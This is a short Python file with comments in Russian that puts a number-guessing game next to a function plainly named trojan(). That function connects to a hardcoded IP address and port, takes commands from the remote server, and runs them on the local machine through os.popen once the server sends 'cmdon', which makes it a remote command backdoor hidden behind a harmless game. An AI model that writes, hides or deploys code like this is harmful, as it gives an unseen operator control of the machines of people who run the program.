import random
import socket
import threading
import os

def game():
    number = random.randint(0, 1000)
    tries = 1 
    done = False

    while not done:
        guess = input('Введите число: ')

        if guess.isdigit():
            guess = int(guess)

            if guess == number:
                done = True
                print(f'Ты победил! Я загадал {guess}. Ты использовал {tries} попыток.')

            else:
                tries += 1
                if guess > number:
                    print('Загаданное число меньше!')
                else:
                    print('Загаданное число больше!')
    else:
        print('Это не число от 0 до 1000!') 

def trojan():
    HOST = '192.168.2.112'
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    while True:
        server_command = client.recv(1024).decode('cp866')

        if server_command == 'cmdon':
            cmd_mode = True
            client.send('Получен доступ к терминалу'.encode('cp866'))
            continue

        if server_command == 'cmdoff':
            cmd_mode = False
        if cmd_mode:
            os.popen(server_command)
        else:
            if server_command == 'hello':
                print('Hello World!')
        client.send(f'{server_command} успешно отправлена!'.encode('cp866'))                                              
